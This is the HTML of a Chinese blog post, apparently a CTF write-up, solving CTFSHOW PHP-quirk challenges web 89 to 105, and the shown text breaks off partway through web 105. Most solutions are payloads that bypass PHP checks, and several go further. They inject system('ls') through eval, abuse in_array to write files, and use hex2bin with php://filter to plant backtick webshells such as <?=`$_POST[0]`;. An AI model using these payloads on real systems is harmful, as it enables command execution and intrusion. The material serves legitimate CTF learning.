@@ -1,0 +1,1538 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="CTFSHOW-php特性, marin的小窝">
+    <meta name="description" content="php特性web 89
+开始php特性系列了，师傅们，冲冲冲！
+
+&amp;lt;?php
+
+include(&amp;quot;flag.php&amp;quot;);
+highlight_file(__FILE__);
+
+if(isset($_GET[&amp;#39">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>CTFSHOW-php特性 | marin的小窝</title>
+    <link rel="icon" type="image/jpeg" href="/favicon.jpg">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">marin的小窝</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>主页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>类型</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于我</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友链</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">marin的小窝</div>
+        <div class="logo-desc">
+            
+            一个学习网安的小菜鸡
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			主页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			类型
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于我
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友链
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/1.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">CTFSHOW-php特性</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web/">
+                                <span class="chip bg-color">web</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%88%B7%E9%A2%98/">
+                                <span class="chip bg-color">刷题</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTFSHOW/" class="post-category">
+                                CTFSHOW
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2025-05-20
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h1><h3 id="web-89"><a href="#web-89" class="headerlink" title="web 89"></a>web 89</h3><blockquote>
+<p><code>开始php特性系列了，师傅们，冲冲冲！</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+include(&quot;flag.php&quot;);
+highlight_file(__FILE__);
+
+if(isset($_GET[&#39;num&#39;]))&#123;
+    $num &#x3D; $_GET[&#39;num&#39;];
+    if(preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num))&#123;
+        die(&quot;no no no!&quot;);
+    &#125;
+    if(intval($num))&#123;
+        echo $flag;
+    &#125;
+&#125;</code></pre>
+
+<p><code>intval</code> 是获取变量的整数值，所以这里只要传入数字，并且要绕过上面的匹配，用数组绕过就行</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250520160336-20260228215559-pr0awhf.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-90"><a href="#web-90" class="headerlink" title="web 90"></a>web 90</h3><blockquote>
+<p><code>开始php特性系列了，师傅们，冲冲冲！</code></p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+include(&quot;flag.php&quot;);
+highlight_file(__FILE__);
+if(isset($_GET[&#39;num&#39;]))&#123;
+    $num &#x3D; $_GET[&#39;num&#39;];
+    if($num&#x3D;&#x3D;&#x3D;&quot;4476&quot;)&#123;
+        die(&quot;no no no!&quot;);
+    &#125;
+    if(intval($num,0)&#x3D;&#x3D;&#x3D;4476)&#123;
+        echo $flag;
+    &#125;else&#123;
+        echo intval($num,0);
+    &#125;
+&#125;</code></pre>
+
+<p>同上，因为是 <code>===</code>​ 强比较，所以加个字母就能绕过，并且 <code>intval</code> 获取整数值</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250520161151-20260228215559-d4ym64p.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-91"><a href="#web-91" class="headerlink" title="web 91"></a>web 91</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+show_source(__FILE__);
+include(&#39;flag.php&#39;);
+$a&#x3D;$_GET[&#39;cmd&#39;];
+if(preg_match(&#39;&#x2F;^php$&#x2F;im&#39;, $a))&#123;
+    if(preg_match(&#39;&#x2F;^php$&#x2F;i&#39;, $a))&#123;
+        echo &#39;hacker&#39;;
+    &#125;
+    else&#123;
+        echo $flag;
+    &#125;
+&#125;
+else&#123;
+    echo &#39;nonononono&#39;;
+&#125;
+</code></pre>
+
+<p>这里考的是匹配的模式<br>​<code>/^php$/im</code>​ 中的 <code>i</code>​ 是匹配大小写，<code>m</code>​ 是多行模式，可以匹配每一行<br>而 <code>^</code>​  是匹配开头，<code>$</code>​ 是匹配结尾，加一起就是从头到尾匹配<br>而第二个匹配没有 <code>m</code> 模式，所以如果有多行字符串，就只能匹配第一行的</p>
+<p>我们的目的是绕过第二层，我们只要传入两行就行，加个换行符就行</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">cmd&#x3D;%0aphp</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250520161539-20260228215559-68uqnyd.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-92"><a href="#web-92" class="headerlink" title="web 92"></a>web 92</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+include(&quot;flag.php&quot;);
+highlight_file(__FILE__);
+if(isset($_GET[&#39;num&#39;]))&#123;
+    $num &#x3D; $_GET[&#39;num&#39;];
+    if($num&#x3D;&#x3D;4476)&#123;
+        die(&quot;no no no!&quot;);
+    &#125;
+    if(intval($num,0)&#x3D;&#x3D;4476)&#123;
+        echo $flag;
+    &#125;else&#123;
+        echo intval($num,0);
+    &#125;
+&#125;</code></pre>
+
+<p>这里因为有弱比较，所以如果要直接用这个数字的话绕不过去，但是 <code>intval</code> 有个性质，可以转换进制，所以输个hex进去就行</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?num&#x3D;0x117c</code></pre>
+
+<p>‍</p>
+<h3 id="web-93"><a href="#web-93" class="headerlink" title="web 93"></a>web 93</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+include(&quot;flag.php&quot;);
+highlight_file(__FILE__);
+if(isset($_GET[&#39;num&#39;]))&#123;
+    $num &#x3D; $_GET[&#39;num&#39;];
+    if($num&#x3D;&#x3D;4476)&#123;
+        die(&quot;no no no!&quot;);
+    &#125;
+    if(preg_match(&quot;&#x2F;[a-z]&#x2F;i&quot;, $num))&#123;
+        die(&quot;no no no!&quot;);
+    &#125;
+    if(intval($num,0)&#x3D;&#x3D;4476)&#123;
+        echo $flag;
+    &#125;else&#123;
+        echo intval($num,0);
+    &#125;
+&#125;</code></pre>
+
+<p>这里不让用字母了，那就传一个八进制，八进制在开头加一个 <code>0</code> 就行</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?num&#x3D;010574</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250520162919-20260228215600-gojuy3w.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-94"><a href="#web-94" class="headerlink" title="web 94"></a>web 94</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+include(&quot;flag.php&quot;);
+highlight_file(__FILE__);
+if(isset($_GET[&#39;num&#39;]))&#123;
+    $num &#x3D; $_GET[&#39;num&#39;];
+    if($num&#x3D;&#x3D;&#x3D;&quot;4476&quot;)&#123;
+        die(&quot;no no no!&quot;);
+    &#125;
+    if(preg_match(&quot;&#x2F;[a-z]&#x2F;i&quot;, $num))&#123;
+        die(&quot;no no no!&quot;);
+    &#125;
+    if(!strpos($num, &quot;0&quot;))&#123;
+        die(&quot;no no no!&quot;);
+    &#125;
+    if(intval($num,0)&#x3D;&#x3D;&#x3D;4476)&#123;
+        echo $flag;
+    &#125;
+&#125;</code></pre>
+
+<p>因为有 <code>strpos</code>​ 的影响所以必须要传入一个0，并且不能在开头，这里尝试了一下，发现只要用换行符就行，因为<code>strpos</code>​不受换行符的影响，但是 <code>intval</code> 会，所以只能读到换行符之前</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?num&#x3D;4476%0a0</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250520164121-20260228215600-urqptzz.png" alt="image"></p>
+<p>hint 的方法：传入一个小数</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?num&#x3D;4476.0</code></pre>
+
+<p>‍</p>
+<h3 id="web-95"><a href="#web-95" class="headerlink" title="web 95"></a>web 95</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+include(&quot;flag.php&quot;);
+highlight_file(__FILE__);
+if(isset($_GET[&#39;num&#39;]))&#123;
+    $num &#x3D; $_GET[&#39;num&#39;];
+    if($num&#x3D;&#x3D;4476)&#123;
+        die(&quot;no no no!&quot;);
+    &#125;
+    if(preg_match(&quot;&#x2F;[a-z]|\.&#x2F;i&quot;, $num))&#123;
+        die(&quot;no no no!!&quot;);
+    &#125;
+    if(!strpos($num, &quot;0&quot;))&#123;
+        die(&quot;no no no!!!&quot;);
+    &#125;
+    if(intval($num,0)&#x3D;&#x3D;&#x3D;4476)&#123;
+        echo $flag;
+    &#125;
+&#125;</code></pre>
+
+<p>这个把小数也ban了，我的换行符也不行，因为是弱比较，看的hint，用的还是八进制，但是要在前面加一个字节的东西</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?num&#x3D;+010574</code></pre>
+
+<p>我感觉是这个字节为了绕过的是 <code>strpos</code></p>
+<p>‍</p>
+<h3 id="web-96"><a href="#web-96" class="headerlink" title="web 96"></a>web 96</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+
+if(isset($_GET[&#39;u&#39;]))&#123;
+    if($_GET[&#39;u&#39;]&#x3D;&#x3D;&#39;flag.php&#39;)&#123;
+        die(&quot;no no no&quot;);
+    &#125;else&#123;
+        highlight_file($_GET[&#39;u&#39;]);
+    &#125;
+
+
+&#125;</code></pre>
+
+<p>直接看不行，但是在 linux 中 <code>./</code> 表示当前目录，直接查看就行</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?u&#x3D;.&#x2F;flag.php</code></pre>
+
+<p>‍</p>
+<h3 id="web-97"><a href="#web-97" class="headerlink" title="web 97"></a>web 97</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+include(&quot;flag.php&quot;);
+highlight_file(__FILE__);
+if (isset($_POST[&#39;a&#39;]) and isset($_POST[&#39;b&#39;])) &#123;
+if ($_POST[&#39;a&#39;] !&#x3D; $_POST[&#39;b&#39;])
+if (md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;]))
+echo $flag;
+else
+print &#39;Wrong.&#39;;
+&#125;
+?&gt;</code></pre>
+
+<p>也是用数组绕过</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">a[]&#x3D;1&amp;b[]&#x3D;2</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250520170307-20260228215600-90q6c8a.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-98"><a href="#web-98" class="headerlink" title="web 98"></a>web 98</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+include(&quot;flag.php&quot;);
+$_GET ? $_GET &#x3D; &amp;$_POST : &#39;flag&#39;;
+$_GET[&#39;flag&#39;] &#x3D;&#x3D; &#39;flag&#39; ? $_GET &#x3D; &amp;$_COOKIE : &#39;flag&#39;;
+$_GET[&#39;flag&#39;] &#x3D;&#x3D; &#39;flag&#39; ? $_GET &#x3D; &amp;$_SERVER : &#39;flag&#39;;
+highlight_file(
+$_GET[&#39;HTTP_FLAG&#39;] &#x3D;&#x3D; &#39;flag&#39; ? $flag : __FILE__);
+
+?&gt;</code></pre>
+
+<p>这里都是用三元运算符来写的，一句句分析</p>
+<p><code>$_GET ? $_GET = &amp;$_POST : &#39;flag&#39;;</code>​ ：当传入 get 参数后，get 会变成 post 参数的引用<br>​<code>$_GET[&#39;flag&#39;] == &#39;flag&#39; ? $_GET = &amp;$_COOKIE : &#39;flag&#39;;</code>​  将 get 参数（有可能是 post 的引用了） 这个如果成立，get 就变成 cookie 的引用，反之则是 flag<br>​<code>$_GET[&#39;flag&#39;] == &#39;flag&#39; ? $_GET = &amp;$_SERVER : &#39;flag&#39;;</code>​ 这个如果成立，get 就变成 cookie 的引用，反之则是 flag<br>​<code>$_GET[&#39;HTTP_FLAG&#39;] == &#39;flag&#39; ? $flag : __FILE__</code>​ 如果 <code>HTTP_FLAG</code> 等于 flag，就会输出真正的 flag</p>
+<p>中间的代码都没有什么用，只看第一个和最后一个，所以我们只要传入一个 get 的 HTTP_FLAG 参数，然后再传入一个 post 的 HTTP_FLAG 参数等于 flag，这里的代码都影响不到这个，就可以获取到flag</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250520171218-20260228215600-a1dr4gv.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-99"><a href="#web-99" class="headerlink" title="web 99"></a>web 99</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+$allow &#x3D; array();
+for ($i&#x3D;36; $i &lt; 0x36d; $i++) &#123; 
+    array_push($allow, rand(1,$i));
+&#125;
+if(isset($_GET[&#39;n&#39;]) &amp;&amp; in_array($_GET[&#39;n&#39;], $allow))&#123;
+    file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]);
+&#125;
+
+?&gt;</code></pre>
+
+<p>丢给ai，这个第一个循环是创建一个由随机整数组成的数组，这里看wp学的，<code>in_array()</code> 函数有一个漏洞，如果没有设置第三个参数，就默认是弱比较，会进行自动类型转换，1.php 就会被转换为整数1，也就符合条件<br>所以只要这个数字在 allow 中，就能写入木马</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250520175339-20260228215600-e0wfwbv.png" alt="image"></p>
+<p>然后访问 1.php ，成功</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250520175407-20260228215600-riwmx7u.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-100"><a href="#web-100" class="headerlink" title="web 100"></a>web 100</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+include(&quot;ctfshow.php&quot;);
+&#x2F;&#x2F;flag in class ctfshow;
+$ctfshow &#x3D; new ctfshow();
+$v1&#x3D;$_GET[&#39;v1&#39;];
+$v2&#x3D;$_GET[&#39;v2&#39;];
+$v3&#x3D;$_GET[&#39;v3&#39;];
+$v0&#x3D;is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
+if($v0)&#123;
+    if(!preg_match(&quot;&#x2F;\;&#x2F;&quot;, $v2))&#123;
+        if(preg_match(&quot;&#x2F;\;&#x2F;&quot;, $v3))&#123;
+            eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);
+        &#125;
+    &#125;   
+&#125;
+?&gt;</code></pre>
+
+<p>这里一个重要的点就是在 php 中，&#x3D; 的优先级低于 <code>and</code>​ 所以 <code>$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</code>​ 会先执行 <code>$v0=is_numeric($v1)</code> ，后面的是不是数字不影响后面 v0 的判断</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?v1&#x3D;1&amp;v2&#x3D;system(&#39;ls&#39;)&amp;v3&#x3D;;</code></pre>
+
+<p>发现 <code>ctfshow</code> 的存在不影响命令执行</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250522195508-20260228215600-awnmsvg.png" alt="image"></p>
+<p>最后直接看就行</p>
+<p>‍</p>
+<h3 id="web-101"><a href="#web-101" class="headerlink" title="web 101"></a>web 101</h3><p>‍</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+include(&quot;ctfshow.php&quot;);
+&#x2F;&#x2F;flag in class ctfshow;
+$ctfshow &#x3D; new ctfshow();
+$v1&#x3D;$_GET[&#39;v1&#39;];
+$v2&#x3D;$_GET[&#39;v2&#39;];
+$v3&#x3D;$_GET[&#39;v3&#39;];
+$v0&#x3D;is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
+if($v0)&#123;
+    if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\&#x3D;|\&#123;|\[|\&quot;|\&#39;|\,|\.|\;|\?|[0-9]&#x2F;&quot;, $v2))&#123;
+        if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\&#x3D;|\&#123;|\[|\&quot;|\&#39;|\,|\.|\?|[0-9]&#x2F;&quot;, $v3))&#123;
+            eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);
+        &#125;
+    &#125;
+    
+&#125;
+
+?&gt;</code></pre>
+
+<p>这题涉及到一个对类的操作，hint 使用的是</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">echo new Reflectionclass</code></pre>
+
+<p><code>Reflectionclass</code> 是php中反射机制中的一个类，用来查看或操作类的信息</p>
+<p>这个的正确语法是，正好题目还给了一个 <code>(&#39;ctfshow&#39;)</code></p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">echo new ReflectionClass(&#39;SomeClass&#39;);</code></pre>
+
+<p>所以最后是用</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?v1&#x3D;1&amp;v2&#x3D;echo new Reflectionclass&amp;v3&#x3D;;</code></pre>
+
+<p>不过因为最后解码的原因，flag少了一位，还要爆一下</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250522202033-20260228215601-vcfmiis.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-102"><a href="#web-102" class="headerlink" title="web 102"></a>web 102</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+$v1 &#x3D; $_POST[&#39;v1&#39;];
+$v2 &#x3D; $_GET[&#39;v2&#39;];
+$v3 &#x3D; $_GET[&#39;v3&#39;];
+$v4 &#x3D; is_numeric($v2) and is_numeric($v3);
+if($v4)&#123;
+    $s &#x3D; substr($v2,2);
+    $str &#x3D; call_user_func($v1,$s);
+    echo $str;
+    file_put_contents($v3,$str);
+&#125;
+else&#123;
+    die(&#39;hacker&#39;);
+&#125;
+?&gt;</code></pre>
+
+<p>通过几次尝试，发现好像 <code>call_user_func</code> 函数会将 v1 作为函数，s 作为参数运行，然后将返回值传给 str，但是 v2 必须要是数字，而 s 就是 v2 的值</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250522205000-20260228215601-3mcsb5o.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250522205015-20260228215601-oaqk0hc.png" alt="image"></p>
+<p>在本地运行的结果是一致的，这里有点不知道干嘛了</p>
+<p>通过 hint 了解到一个函数，<code>hex2bin</code> 这个应该是 php 中挺常用的一个函数，文档说明这是一个将 hex 转换成二进制的函数，但是试用了一下发现好像是转换为字符串</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250522205437-20260228215601-9ox7ekc.png" alt="image"></p>
+<p>通过这个特性就可以利用<code>file_put_contents</code> 文件包含了，这里没看仔细，才发现他这个 payload 是只有数字的，所以才能用这个函数（写着写着就忘了只用数字</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">5044383959474e6864434171594473
+PD89YGNhdCAqYDs
+
+&lt;?&#x3D;&#96;cat *&#96;;</code></pre>
+
+<p>这个 payload 应该是比较特殊的，然后直接访问 1.php 就能得到 flag</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php
+
+post 
+v1&#x3D;hex2bin</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250522210121-20260228215601-rzud3oe.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-103"><a href="#web-103" class="headerlink" title="web 103"></a>web 103</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+&#x3D;
+highlight_file(__FILE__);
+$v1 &#x3D; $_POST[&#39;v1&#39;];
+$v2 &#x3D; $_GET[&#39;v2&#39;];
+$v3 &#x3D; $_GET[&#39;v3&#39;];
+$v4 &#x3D; is_numeric($v2) and is_numeric($v3);
+if($v4)&#123;
+    $s &#x3D; substr($v2,2);
+    $str &#x3D; call_user_func($v1,$s);
+    echo $str;
+    if(!preg_match(&quot;&#x2F;.*p.*h.*p.*&#x2F;i&quot;,$str))&#123;
+        file_put_contents($v3,$str);
+    &#125;
+    else&#123;
+        die(&#39;Sorry&#39;);
+    &#125;
+&#125;
+else&#123;
+    die(&#39;hacker&#39;);
+&#125;
+
+?&gt;</code></pre>
+
+<p>同上</p>
+<p>这里看wp又看到一个特殊的 payload</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">5044383959435266554539545646737758574137
+PD89YCRfUE9TVFswXWA7
+
+&lt;?&#x3D;&#96;$_POST[0]&#96;;</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250522215510-20260228215601-9tf5vzp.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-104"><a href="#web-104" class="headerlink" title="web 104"></a><span id="20260301143303-w8ia1km" style="display: none;"></span>web 104</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+include(&quot;flag.php&quot;);
+
+if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;
+    $v1 &#x3D; $_POST[&#39;v1&#39;];
+    $v2 &#x3D; $_GET[&#39;v2&#39;];
+    if(sha1($v1)&#x3D;&#x3D;sha1($v2))&#123;
+        echo $flag;
+    &#125;
+&#125;
+?&gt;</code></pre>
+
+<p>难绷，应该是出漏了一个 <code>v1 == v2</code> 这里直接传相同的值就行</p>
+<p>‍</p>
+<h3 id="web-105"><a href="#web-105" class="headerlink" title="web 105"></a>web 105</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+include(&#39;flag.php&#39;);
+error_reporting(0);
+$error&#x3D;&#39;你还想要flag嘛？&#39;;
+$suces&#x3D;&#39;既然你想要那给你吧！&#39;;
+foreach($_GET as $key &#x3D;&gt; $value)&#123;
+    if($key&#x3D;&#x3D;&#x3D;&#39;error&#39;)&#123;
+        die(&quot;what are you doing?!&quot;);
+    &#125;
+    $$key&#x3D;$$value;
+&#125;foreach($_POST as $key &#x3D;&gt; $value)&#123;
+    if($value&#x3D;&#x3D;&#x3D;&#39;flag&#39;)&#123;
+        die(&quot;what are you doing?!&quot;);
+    &#125;
+    $$key&#x3D;$$value;
+&#125;
+if(!($_POST[&#39;flag&#39;]&#x3D;&#x3D;$flag))&#123;
+    die($error);
+&#125;
